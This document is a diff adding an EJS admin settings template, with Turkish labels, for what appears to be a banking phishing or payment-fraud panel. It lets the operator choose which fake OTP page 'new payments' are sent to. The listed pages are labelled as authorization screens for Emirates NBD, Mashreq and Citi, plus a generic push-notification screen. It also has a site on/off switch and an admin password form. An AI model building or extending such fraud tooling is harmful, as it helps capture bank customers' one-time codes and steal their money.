@@ -1,0 +1,84 @@
+<%- include('_layout', { pageTitle: 'Ayarlar', activePage: 'settings', adminUser }) %>
+
+<% if (typeof dbError !== 'undefined' && dbError) { %>
+<div style="background:#fef2f2;border:1px solid #fecaca;padding:16px;border-radius:12px;color:#dc2626;margin-bottom:20px;">⚠️ <%= dbError %></div>
+<% } else { %>
+
+<% if (saved) { %>
+<div style="background:#dcfce7;border:1px solid #86efac;padding:12px 16px;border-radius:10px;color:#166534;margin-bottom:20px;">✅ Ayarlar kaydedildi.</div>
+<% } %>
+<% if (typeof error !== 'undefined' && error) { %>
+<div style="background:#fef2f2;border:1px solid #fecaca;padding:12px 16px;border-radius:10px;color:#dc2626;margin-bottom:20px;">⚠️ <%= error %></div>
+<% } %>
+
+<!-- Ana Ayarlar -->
+<form method="POST" action="/admin/settings">
+<div class="form-section">
+  <h3>⚙️ Genel Ayarlar</h3>
+  <div class="form-row">
+    <div class="form-group">
+      <label>Varsayılan OTP Sayfası</label>
+      <select name="otp_default_page">
+        <option value="otp-sms"     <%= otpDefault==='otp-sms'     ? 'selected' : '' %>>📱 SMS OTP (otp-sms)</option>
+        <option value="otp"         <%= otpDefault==='otp'         ? 'selected' : '' %>>🏦 Emirates NBD (otp)</option>
+        <option value="otp-mashreq" <%= otpDefault==='otp-mashreq' ? 'selected' : '' %>>🟠 Mashreq (otp-mashreq)</option>
+        <option value="otp-citi"    <%= otpDefault==='otp-citi'    ? 'selected' : '' %>>🔵 Citi (otp-citi)</option>
+      </select>
+      <div class="text-sm text-muted mt-1">Yeni ödemelerin varsayılan olarak yönlendirileceği sayfa.</div>
+    </div>
+    <div class="form-group">
+      <label>Site Durumu</label>
+      <select name="site_active">
+        <option value="1" <%= siteActive==='1' ? 'selected' : '' %>>✅ Aktif</option>
+        <option value="0" <%= siteActive==='0' ? 'selected' : '' %>>🔴 Kapalı</option>
+      </select>
+    </div>
+  </div>
+  <button type="submit" name="save_settings" class="btn btn-green">💾 Kaydet</button>
+</div>
+</form>
+
+<!-- OTP Sayfaları -->
+<div class="form-section">
+  <h3>📄 OTP Sayfaları</h3>
+  <table style="width:100%;font-size:13px;">
+    <thead><tr><th>Sayfa</th><th>URL</th><th>Kullanım</th></tr></thead>
+    <tbody>
+      <tr><td><span class="badge badge-otp">otp-sms</span></td><td class="mono">/otp-sms</td><td>Genel push bildirim ekranı (varsayılan)</td></tr>
+      <tr><td><span class="badge badge-otp">otp</span></td><td class="mono">/otp</td><td>Emirates NBD ENBDX yetkilendirme</td></tr>
+      <tr><td><span class="badge badge-otp">otp-mashreq</span></td><td class="mono">/otp-mashreq</td><td>Mashreq banka yetkilendirme</td></tr>
+      <tr><td><span class="badge badge-otp">otp-citi</span></td><td class="mono">/otp-citi</td><td>Citi Mobile App yetkilendirme</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<!-- Şifre Değiştir -->
+<% if (typeof pwMsg !== 'undefined' && pwMsg) { %>
+<div style="background:<%= pwMsg.type==='success' ? '#dcfce7' : '#fef2f2' %>;border:1px solid <%= pwMsg.type==='success' ? '#86efac' : '#fecaca' %>;padding:12px 16px;border-radius:10px;color:<%= pwMsg.type==='success' ? '#166534' : '#dc2626' %>;margin-bottom:16px;">
+  <%= pwMsg.type==='success' ? '✅' : '⚠️' %> <%= pwMsg.text %>
+</div>
+<% } %>
+<form method="POST" action="/admin/settings">
+<div class="form-section">
+  <h3>🔐 Şifre Değiştir</h3>
+  <div class="form-row">
+    <div class="form-group">
+      <label>Mevcut Şifre</label>
+      <input type="password" name="current_password" placeholder="••••••••" required>
+    </div>
+    <div class="form-group">
+      <label>Yeni Şifre</label>
+      <input type="password" name="new_password" placeholder="En az 6 karakter" required>
+    </div>
+    <div class="form-group">
+      <label>Yeni Şifre (Tekrar)</label>
+      <input type="password" name="new_password2" placeholder="••••••••" required>
+    </div>
+  </div>
+  <button type="submit" name="change_password" class="btn btn-blue">🔑 Şifreyi Değiştir</button>
+</div>
+</form>
+
+<% } %>
+
+<%- include('_layout_end') %>
